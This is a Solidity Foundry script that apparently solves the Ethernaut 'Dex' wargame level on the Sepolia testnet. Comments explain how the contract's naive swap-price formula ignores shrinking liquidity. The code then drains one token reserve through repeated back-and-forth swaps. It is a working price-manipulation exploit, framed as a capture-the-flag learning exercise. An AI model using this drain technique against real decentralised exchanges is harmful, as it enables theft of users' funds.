// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Dex.s.sol --tc DexSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract DexSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("DEX_INSTANCE");
    // get the owner address
    address public myAddress = vm.envAddress("MY_ADDRESS");

    // attack idea: the Dex contract is a AMM that uses simple math to calculate the swap price
    // amountOut = (amountIn * reserveOut) / reserveIn
    // lets see what happens when we swap all 10 token 1 for token 2
    // since the reserve is 100 - 100, the swap price is 10
    // so we will have 0 token1 and 20 token2
    // the contract will have 110 token1 and 90 token2
    // since the reserve is 110 - 90, the token2 will be worth (reverseToken1/reverseToken2) = 1.22
    // so we can swap 20 token2 for 24.4 token1
    // and we can repeat this process until we drain all of one of the tokens
    // this happends since the getSwapPrice function does not take into account for the decreasing liquidity
    // in real world scenarios, protocols uses more complex formulas like the constant product formula (uniswap)

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        Dex dexInstance = Dex(instance);
        address token1 = dexInstance.token1();
        address token2 = dexInstance.token2();
        // approve the contract to spend the tokens
        dexInstance.approve(instance, type(uint256).max);
        // start swapping until we drain one of the tokens
        uint256 token1Reserve;
        uint256 token2Reserve;
        while (true) {
            token1Reserve = dexInstance.balanceOf(token1, instance);
            token2Reserve = dexInstance.balanceOf(token2, instance);
            uint256 userToken1Balance = dexInstance.balanceOf(token1, myAddress);
            uint256 userToken2Balance = dexInstance.balanceOf(token2, myAddress);

            console.log("Token1 Reserve: ", token1Reserve);
            console.log("Token2 Reserve: ", token2Reserve);
            console.log("User Token1 Balance: ", userToken1Balance);
            console.log("User Token2 Balance: ", userToken2Balance);

            if (token1Reserve == 0 || token2Reserve == 0) {
                break;
            }

            // swap the one with the most balance
            if (userToken1Balance >= userToken2Balance) {
                // using all the user token1 balance
                uint256 Amount2Out = dexInstance.getSwapPrice(token1, token2, userToken1Balance);
                // if the amount is more than the reserve, we need to use the reserve instead
                if (Amount2Out > token2Reserve) {
                    // swap with the reserve 1 as the Input amount
                    dexInstance.swap(token1, token2, token1Reserve);
                } else {
                    dexInstance.swap(token1, token2, userToken1Balance);
                }
            } else {
                // using all the user token1 balance
                uint256 Amount1Out = dexInstance.getSwapPrice(token2, token1, userToken2Balance);
                // if the amount is more than the reserve, we need to use the reserve instead
                if (Amount1Out > token1Reserve) {
                    // swap with the reserve 1 as the Input amount
                    dexInstance.swap(token2, token1, token2Reserve);
                } else {
                    dexInstance.swap(token2, token1, userToken2Balance);
                }
            }
        }

        vm.stopBroadcast();
    }
}
